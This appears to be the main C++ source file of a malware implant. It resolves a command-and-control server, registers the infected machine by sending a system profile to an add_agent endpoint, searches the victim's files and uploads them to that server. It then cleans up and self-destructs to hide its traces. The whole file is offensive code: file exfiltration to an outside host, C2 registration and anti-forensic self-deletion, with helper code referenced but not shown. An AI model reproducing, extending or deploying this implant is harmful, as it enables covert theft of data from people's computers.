#include "Core/upload.hpp"
#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Communication/addagent.hpp"
#include "Core/helpers.hpp"
#include "Core/file_search.hpp"



int main() {

    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {  
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            std::wstring C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                // Path to /add_agent
                std::wstring PC2 = C2 + Stage1Path;
                nlohmann::json JsonProfile = Profiler(); 
                std::string response = SendProfile(PC2, JsonProfile);
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    std::cout << "Running file search" << std::endl;
                    ProcessFilesAndUpload(C2);
                }
            }
        }
        Cleanup();
        SelfDestruct(); 
    }

    // This code might never see the light of the day but I gonna keep here anyways...
    Cleanup();
    SelfDestruct(); 
    

    return 0;
}

